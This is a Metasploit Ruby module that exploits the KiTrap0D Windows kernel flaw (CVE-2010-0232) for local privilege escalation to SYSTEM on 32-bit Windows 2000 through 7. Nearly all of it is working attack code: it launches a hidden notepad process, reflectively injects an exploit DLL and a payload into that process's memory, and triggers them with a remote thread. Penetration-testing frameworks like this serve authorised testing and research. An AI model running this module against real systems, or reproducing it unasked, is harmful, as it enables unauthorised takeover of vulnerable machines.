##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/exe'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Post::File
  include Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows SYSTEM escalation via KiTrap0D',
      'Description'   => %q{
        This module will create a new session with SYSTEM privileges via the
        KiTrap0D exlpoit by Tavis Ormandy. If the session is use is already
        elevated then the exploit will not run. The module relies on kitrap0d.x86.dll,
        and is not supported on x64 editions of Windows.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'Tavis Ormandy', # Original resesarcher and exploit creator
          'HD Moore',      # Port of Tavis' code to meterpreter module
          'Pusscat',       # Port of Tavis' code to meterpreter module
          'OJ Reeves'      # Port of meterpreter code to a windows local exploit
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
        [ 'Windows 2K SP4 - Windows 7 (x86)', { 'Arch' => ARCH_X86, 'Platform' => 'win' } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [ 'CVE', '2010-0232' ],
        [ 'OSVDB', '61854' ],
        [ 'MSB', 'MS10-015' ],
        [ 'EDB', '11199' ],
        [ 'URL', 'http://seclists.org/fulldisclosure/2010/Jan/341' ]
      ],
      'DisclosureDate'=> "Jan 19 2010"
    ))

  end

  def check
    # Validate platform architecture
    if sysinfo["Architecture"] =~ /x64|WOW64/i
      return Exploit::CheckCode::Safe
    end

    # Validate OS version
    winver = sysinfo["OS"]
    unless winver =~ /Windows 2000|Windows XP|Windows Vista|Windows 2003|Windows 2008|Windows 7/
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, 'Session is already elevated')
    end

    if check == Exploit::CheckCode::Safe
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
    end

    dll = ''
    offset = nil

    print_status("Launching notepad to host the exploit...")
    cmd = "notepad.exe"
    opts = {'Hidden' => true}
    process = client.sys.process.execute(cmd, nil, opts)
    pid = process.pid
    host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
    print_good("Process #{pid} launched.")

    print_status("Reflectively injecting the exploit DLL into #{pid}...")
    library_path = ::File.join(Msf::Config.data_directory, "exploits",
                               "CVE-2010-0232", "kitrap0d.x86.dll")
    library_path = ::File.expand_path(library_path)
    ::File.open(library_path, 'rb') { |f| dll = f.read }
    pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(dll))
    pe.exports.entries.each do |e|
      if e.name =~ /^\S*ReflectiveLoader\S*/
        offset = pe.rva_to_file_offset(e.rva)
        break
      end
    end
    # Inject the exloit, but don't run it yet.
    exploit_mem = inject_into_pid(dll, host_process)

    print_status("Exploit injected. Injecting payload into #{pid}...")
    # Inject the payload into the process so that it's runnable by the exploit.
    payload_mem = inject_into_pid(payload.encoded, host_process)

    print_status("Payload injected. Executing exploit...")
    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    host_process.thread.create(exploit_mem + offset, payload_mem)

    print_good("Exploit finished, wait for (hopefully privileged) payload execution to complete.")
  end

protected

  def inject_into_pid(payload, process)
    payload_size = payload.length
    payload_size += 1024 - (payload.length % 1024) unless payload.length % 1024 == 0
    payload_mem = process.memory.allocate(payload_size)
    process.memory.protect(payload_mem)
    process.memory.write(payload_mem, payload)
    return payload_mem
  end

end
